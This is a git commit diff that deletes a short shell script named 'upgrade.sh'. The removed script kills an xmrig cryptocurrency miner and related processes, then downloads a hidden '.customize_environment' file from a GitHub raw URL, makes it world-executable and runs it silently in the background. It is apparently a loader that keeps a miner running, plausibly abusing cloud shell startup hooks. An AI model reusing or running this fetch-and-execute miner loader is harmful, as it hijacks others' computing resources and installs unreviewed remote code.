fef2d4b22975b8686c819d511d3774a8609170a7
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-20 14:50:50 -0300

    Delete upgrade.sh

--- upgrade.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-
-if [ $2 != '0.3' ]
-then
-   pkill xmrig ; pkill ping.sh ; pkill .customize_environment ; rm -rf .customize_environment ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; nohup ./.customize_environment > /dev/null &
-fi
-
-echo 'upgrade ok'
